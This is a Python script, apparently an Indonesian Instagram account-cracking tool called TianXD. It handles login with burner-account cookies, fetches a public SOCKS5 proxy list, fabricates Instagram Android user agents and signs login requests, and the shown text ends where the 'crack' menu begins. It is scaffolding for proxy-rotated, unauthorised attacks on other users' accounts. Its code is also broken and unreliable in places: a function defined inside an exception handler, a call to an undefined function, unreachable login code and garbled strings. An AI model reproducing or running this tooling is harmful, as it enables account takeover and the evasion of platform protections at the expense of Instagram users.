# coding:utf-8
#/usr/bin/python
try:
	import json
	import uuid
	import hmac
	import rich
	import random
	import hashlib
	import urllib
	import urllib.request
	import calendar
except ImportError as e:
	exit(f'[!] {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
        import rich
except ImportError as e:
        print (f" {M}😛{P}sedang install bahan {H}{e.name}, {P}mohon tunggu...")
        os.system(f"python -m pip install {e.name} &> /dev/null")
        os.system(f"python -m pip install requests &> /dev/null")

from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.tree import Tree
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
from rich.progress import track
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.tree import Tree
from rich import print as prints
from rich.console import Console as sol
from rich.panel import Panel as nel
from rich import print as cetak
console = Console()
from time import sleep as jeda
from rich import print as tulis
from rich.panel import Panel
#+++++# mengambil ip address #+++++#
url = requests.get("http://ip-api.com/json/").json()
try:
	IP  = url["query"]
	CN = url["country"]
	RN = url["regionName"]
	AS = url["as"]
except KeyError:
	IP = "-"
	CN = "-"
	RN = "-"
	AS = "-"
#--- WARNA RICH
Te = '[b]' # tebal 
P = '[#FFFFFF]' # putih
U = '[#AF00FF]' # ungu
O = '[#00FFFF]' # biru muda
M = '[#FF0022]' # merah
Pi = '[#FF0099]' # pink
H = '[#00FF33]' # hijau
K = '[#FFFF00]' # kuning
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
#--- WARNA ANSII (PYTHON)
me = '\x1b[1;91m' # merah
hi = '\x1b[1;92m' # hijau
ku = '\x1b[1;93m' # kuning
bi = '\x1b[1;94m' # biru
un = '\x1b[1;95m' # ungu
br = '\x1b[1;96m' # biru muda
pu = '\x1b[1;97m' # putih
ora = '\033[38;2;255;127;0;1m' # orange
n = '\x1b[0m' # clear
til = 'Ã¢â‚¬Â¢'
ansixx = random.choice([me, hi, ku, bi, un, br, pu, ora])

day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())

try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#FFFFFF"
	
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'

merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
bc = '[bold cyan]'
kuning = '[#FFFF00]'
kn = '[bold yellow]'
hapus  = '[/]'
biru_m = '[bold cyan]'

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

color_table = "#FFFFFF"
color_rich = "[#00C8FF]"
sys.stdout.write('\x1b]2; TIAN XD\x07')

try:os.mkdir('data')
except:pass
try:os.mkdir('result')
except:pass

CY='\033[96;1m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
M3 = "[#d700d7]" # Magenta
bc = '[bold cyan]'
R2 = random.choice([M3, J2, H2, K2, O2, N2, M2, B2])

a = "[#8700af]"
b = "[#87875f]"
c = "[#8787af]"
d = "[#87afff]"
e = "[#87ff00]"
R3 = random.choice([a, b, c, d, e])

insta =[]
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],[]
HARIS, HARIS1, method, ugen, ugen3, ugen2, baru, zx, prox, menudump, uazpepek = {}, {}, [], [], [], [], [], [], [], [], []
oppo=[]
s=requests.Session()
try:
    with requests.Session() as ses:
        _url = ses.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt").text
        for xc in _url.splitlines():
            prox.append(xc)
except requests.exceptions.ConnectionError:
    print(f"{P}[{M}!{P}] koneksi internet anda bermasalah")
    time.sleep(0.3)
    exit()

try:
    # python 2
	urllib_quote_plus = urllib.quote
except:
    # python 3
	urllib_quote_plus = urllib.parse.quote_plus
	
	#--- WAKTU
	def waktu():
		jam = datetime.now().strftime("%X") # jam
		now = datetime.now()
		hours = now.hour
		if 00 <= hours < 11:sapa = "Selamat Pagi ☀"
		elif 11 <= hours < 15:sapa = "Selamat Siang ☁"
		elif 15 <= hours < 18:sapa = "Selamat Sore 🌤"
		elif 18 <= hours < 23:sapa = "Selamat Malam 🌜"
		else:sapa = "Selamat datang"
		return sapa
		
#--- LOGO (LO GOBLOK)
def banner():
	os.system('clear')
	prints(Panel(f"""
╦╔═╗   ╔═╗╦═╗╔═╗╔═╗╦╔═   Script  : TianXD
║║ ╦───║  ╠╦╝╠═╣║  ╠╩╗   Version : 1.2
╩╚═╝   ╚═╝╩╚═╩ ╩╚═╝╩ ╩   Github  : github.com/Tian-XD
""",title=f"{P2}{waktu()}",subtitle=f"{P2}Author TianXD",width=60,padding=(0,2),style=f"green")) 
	
#--- USER AGENT 
USN = "Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 Instagram 76.0.0.15.395 Android (27/8.1.0; 440dpi; 1080x2030; Xiaomi/xiaomi; Redmi Note 5; whyred; qcom; en_US)"

def User_Agent():
	dpi_phone = ['133','320','515','160','640','240','120','440','800','480','225','768','216','1024']
	model_phone = ['Nokia 2.4','HUAWEI','Galaxy','Iphone','Oppo','Mobile Phones','Xiaomi','Samsung','Redmi','Vivo','OnePlus']
	pxl_phone = ['623x1280','700x1245','800x1280','1080x2340','1320x2400','1242x2688']
	i_version = ['114.0.0.20.2','114.0.0.38.120','114.0.0.20.70','114.0.0.28.120','114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/9.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; mozilla/chrome/huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
	return User_Agent

def User_Agent():
	resolutions = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320']
	versions = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100']
	dpis = ['120', '160', '300', '320', '240']
	ver = random.choice(versions)
	dpi = random.choice(dpis)
	res = random.choice(resolutions)
	return ('Instagram 4.{}.{} ''Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)').format(random.randint(1, 2),random.randint(0, 2),random.randint(10, 11),random.randint(1, 3),random.randint(3, 5),random.randint(0, 5),dpi,res,ver,ver,)
	
def User_AgentAPI():
	APP_VERSION = "136.0.0.34.124"
	VERSION_CODE = "208061712"
	DEVICES = {
		"one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolution": "1080x2340","manufacturer": "OnePlus","device": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE},
		"one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE},
		"huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "HUAWEI","device": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE},
		"samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE},
		"one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE},
		"lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2392","manufacturer": "LGE/lge","device": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE},
		"zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "ZTE","device": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},}
	DEFAULT_DEVICE = random.choice(list(DEVICES.keys()))
	app_version = DEVICES[DEFAULT_DEVICE]['app_version']
	android_version = DEVICES[DEFAULT_DEVICE]['android_version']
	android_release = DEVICES[DEFAULT_DEVICE]['android_release']
	dpi = DEVICES[DEFAULT_DEVICE]['dpi']
	resolution = DEVICES[DEFAULT_DEVICE]['resolution']
	manufacturer = DEVICES[DEFAULT_DEVICE]['manufacturer']
	device = DEVICES[DEFAULT_DEVICE]['device']
	model = DEVICES[DEFAULT_DEVICE]['model']
	cpu = DEVICES[DEFAULT_DEVICE]['cpu']
	version_code = DEVICES[DEFAULT_DEVICE]['version_code']
	USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolution}; {manufacturer}; "+f"{device}; {model}; {cpu}; en_US; {version_code})"
	return USER_AGENT_BASE


#--- JALAN
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
#--- hapus data login
def removeDATA():
	try:os.remove(".kukis.log")
	except:pass
	try:os.remove(".username")
	except:pass
		
#--- MENGECEK _xyecaaa
class __cek__:
	
	def __init__(self):
		self.hapus = "rm -rf data/user_insta.txt && rm -rf data/cookie_insta.txt"
		self.roomz = requests.Session()
	
	def cekCOK(self):
		try:
			kuki = open('data/cookie_insta.txt','r').read()
			user = open('data/user_insta.txt','r').read()
		except FileNotFoundError:
			os.system(self.hapus)
			self.masuk()
		except Exception as i:
			os.system(self.hapus)
			exit ("%sÃ¢â€¢Â°Ã¢â€â‚¬%s %s "%(pe,me,i));jeda(2)
			
		ex,user = self.cekAPI(kuki)
		cookie = {'cookie':kuki}
		instagram(ex,user,cookie).menu()
	
	def cekAPI(self,cookie):
		user = open('data/user_insta.txt','r').read()
		kukis = {'cookie':cookie}
		try:
			req = self.roomz.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies=kukis,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
			dat = req.json()["data"]["user"]
			nama = dat["full_name"]
			followers = dat["edge_followed_by"]["count"]
			following = dat["edge_follow"]["count"]
			external.append(f'{nama}|{followers}|{following}')
		except FileNotFoundError:
			os.system (self.hapus)
			print ("[{H}😛{P}] anda belum login ");jeda(2)
			self.masuk()
		except (KeyError,ValueError):
			os.system (self.hapus)
			exit (f"[{H}😛{P}] cookie kedaluwarsa ");jeda(2)
		except (AttributeError,UnboundLocalError):
			os.system (self.hapus)
			exit (f"[{H}😛{P}] terjadi kesalahan ");jeda(2)
		return external,user 
		
	def masuk(self):
		global external 
		banner()
		prints(Panel(f"""{P2}[{H2}01{P2}] Login {H2}menggunakan cookies{P2}\n[{H2}02{P2}] Login {H2}menggunakan akun{P2}\n[{H2}03{P2}] Cara mendapatkan {H2}cookies{P2}\n[{H2}00{P2}] Keluar""",title=f"{P2}LOGIN DENGAN CARA APA",width=40,padding=(0,4),style=f"green"))
		rom = input(f'[{H}😛{P}] Pilih : {P}')
		if rom in['']:
			exit (f'[{H}😛{P}] Isi Yang Benar Asu ');jeda(2) 
		
		elif rom in["1","01"]:
			prints(Panel(f"{P2}Wajib gunakan akun tumbal dilarang akun utama",width=50,padding=(0,4),style=f"green"))
			kukis = input(f"[{H}😛{P}] Cookies : {H}")
			if kukis in['']:
				exit (f'{P}[{H}😛{P}] Isi Yang Benar');jeda(2) 
			else:
				try:
					id = re.search('ds_user_id=(\d+)',str(kukis)).group(1)
					po = self.roomz.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers={"user-agent":USN},cookies={"cookie":kukis})
					xx = json.loads(po.text)['user']
					useri = xx["username"]
					user = open('data/user_insta.txt','w').write(useri)
					kuki = open('data/cookie_insta.txt','w').write(kukis)
					#self.cekCOK()
					prints(Panel(f'{P2} login berhasil, jalankan ulang tool nya ketik {M2}:{P2} - {H2}python run.py',width=70,padding=(0,4),style=f"green"));exit()
				except (json.decoder.JSONDecodeError, KeyError, AttributeError):
					os.system (self.hapus)
					exit (f"{P}[{H}😛{P}] cookie invalid ");jeda(2)
				except requests.exceptions.ConnectionError as konek:
					exit (f"{P}[{H}😛{P}] gagal memuat tidak ada koneksi : {konek}");jeda(2)
			
		elif rom in["2","02"]:
			prints(Panel(f"{P2} Wajib gunakan akun tumbal dilarang akun utama",width=50,padding=(0,4),style=f"green"));exit()
			username = input(f"[{H}😛{P}] Username : {H}")
			password = input(f"[{H}😛{P}] Password : {H}")
			if (username,password) in['']:
				exit (f"[{H}😛{P}] jangan kosong");jeda(2)
			else:
				x=instagramAPI(username,password).loginAPI()
				if x.get('status')=='success':
					username = open('data/user_insta.txt','w').write(username)
					kuki = open('data/cookie_insta.txt','w').write(x.get('cookie'))
					cookie={'cookie':x.get('cookie')}
					#self.cekCOK()
					print('')
					print(f'[{H}😛{P}] login berhasil, jalankan ulang tool nya ketik{M}:\n{P} - {H}python cropt.py');exit()
				elif x.get('status')=='checkpoint':
					exit (f"[{H}😛{P}] akun checkpoint");jeda(2)
				else:
					exit (f"[{H}😛{P}] login gagal, silahkan coba lagi");jeda(2)
					
		elif rom in['3','03']:
			print(f"[{H}😛{P}] buka dengan youtube ")
			os.system(" xdg-open https://youtu.be/77xXYcZMLcA");exit()
		
		elif rom in['0','00']:
			jalan(f'[{H}😛{P}] Sampai jumpa tod :) ');exit()
			
		else:
			exit (f'[{H}😛{P}] isi yang benar');jeda(2)

#--- MENGECEK LOGIN AKUN
class instagramAPI:
	API_URL = 'https://i.instagram.com/api/v1/'
	DEVICE_SETTINTS = {'manufacturer': 'Xiaomi','model': 'HM 1SW','android_version': 18,'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
	EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on'''
	SIG_KEY_VERSION = '4'

	def __init__(self,username,password):
		self.username=username
		self.password=password
		m = hashlib.md5()
		m.update(username.encode('utf-8') + password.encode('utf-8'))
		self.device_id = self.generateDeviceId(m.hexdigest())
		self.uuid = self.generateUUID(True)
		self.s = requests.Session()

	def generateDeviceId(self, seed):
		volatile_seed = "12345"
		m = hashlib.md5()
		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
		return 'android-' + m.hexdigest()[:16]

	def generateUUID(self, type):
		generated_uuid = str(uuid.uuid4())
		if (type):
			return generated_uuid
		else:
			return generated_uuid.replace('-', '')

	def loginAPI(self):
		token=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).text
		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
		self.s.headers.update({'Connection': 'close','Accept': '*/*','Content-type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie2': '$Version=1','Accept-Language': 'en-US','User-Agent': user_agentAPI()})
		self.data = json.dumps({
			'phone_id': self.generateUUID(True),
			'_csrftoken': crf_token,
			'username': self.username,
			'guid': self.uuid,
			'device_id': self.device_id,
			'password': self.password,
			'login_attempt_count': '0'})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(self.generateUUID(False),urllib.request.quote(self.data))
		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
		x_jason=json.loads(x.text)
		x_kukis=x.cookies.get_dict()
		if "logged_in_user" in x.text:
			kuki=";".join([v+"="+x_kukis[v] for v in x_kukis])
			#id=x_jason['logged_in_user']['pk']
			#nm=x_jason['logged_in_user']['full_name']
			#pn=x_jason['logged_in_user']['phone_number']
			return {'status':'success','cookie':kuki,'userame':self.username}
		elif 'challenge_required' in x.text:
			return {'status':'checkpoint'}
		else:
			return {'status':'login_error'}

#--- MENU CRACK
C = ''
class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
		self.hapus = "rm -rf data/user_insta.txt && rm -rf data/cookie_insta.txt"
		self.tol = Console()
	
		
	def logo(self):
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
			banner()
			pelerXD=[]
			prints(Panel(f"{H2}{IP}",title=f"{P2}IP",subtitle=f"{P2}{CN}",width=60,padding=(0,30),style=f"green"))
